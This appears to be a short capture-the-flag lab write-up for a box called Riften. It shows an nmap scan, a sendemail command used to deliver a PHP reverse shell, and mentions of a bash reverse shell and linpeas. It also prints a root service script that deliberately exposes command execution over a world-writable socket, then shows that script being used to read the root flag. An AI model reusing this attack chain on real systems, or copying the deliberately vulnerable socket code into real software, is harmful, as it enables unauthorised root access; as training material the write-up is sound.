# CTF 3 


## Hints

- `Get-SCPFolder -ComputerName 'Riften.robstargames.com' -Credential $credential -LocalFolder 'C:\backups' -RemoteFolder '/var/mail/bugs'`
- IP: 192.168.22.65


### Nmap scan

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 16:02 CET
Nmap scan report for Riften.robstargames.com (192.168.22.65)
Host is up (0.00061s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
25/tcp   open   smtp
80/tcp   open   http
443/tcp  closed https
3000/tcp open   ppp

Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds

```


- sendemail -f ultraspam69420@example.com -t bugs@robstargames.com -u "Subject" -m "YadaYada" -s 192.168.22.65 -o tls=no
- sendemail with php revshell ([revshells.com](revshells.com))
- from revshell curl request with bash revshell
- passwort ain't working
- writable path
- SSH-shell is rbash
- with linpeas found /opt/cloak.py:




```
#!/usr/bin/env python3

import socket
import os
import hashlib

if os.path.exists("/run/cloak.sock"):
    os.remove("/run/cloak.sock")

socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket.bind("/run/cloak.sock")
os.system("chmod o+w /run/cloak.sock")

while True:
    socket.listen(1)
    connection, address = socket.accept()

    welcome = "Welcome to the debug socket!\nPlease provide your password: "
    connection.sendall(welcome.encode())

    data = connection.recv(1024)

    # for security reasons I have secured access to the debug socket with password
    hash = "e0dc3deda28c0a78ddb6ed718f9d6332378df1b1ec4654fa2177fbcf773fd9c1"

    if(hashlib.sha256(data.decode().strip().encode()).hexdigest() == hash):
        print("success")
        response = "password accepted!\n"
        connection.sendall(response.encode())

        try:
            while True:
                response = "enter command: "
                connection.sendall(response.encode())
                data = connection.recv(1024)

                if data:
                    returncode = os.system(data)
                    if(returncode == 0):
                        response = "command executed!\n"
                        connection.sendall(response.encode())
                    else:
                        response = "an error has occured..\n"
                        connection.sendall(response.encode())
                        connection.close()
        # sometimes this crashes but I have set up a service that should restart it
        except:
            print("nothing to see here..")

    # just in case..
    else:
        print("invalid password")
        response = "invalid password, goodbye!\n"
        connection.sendall(response.encode())
        connection.close()
```


Read root flag:
```
cat /root/root.txt > /home/stormcloak/out
command executed!
enter command: asdf
asdf
an error has occured..
stormcloak@Riften:~$ cat out
cat out
Your flag is: 8e9e8455f6840e45e8c12798e7a47bf2 
```

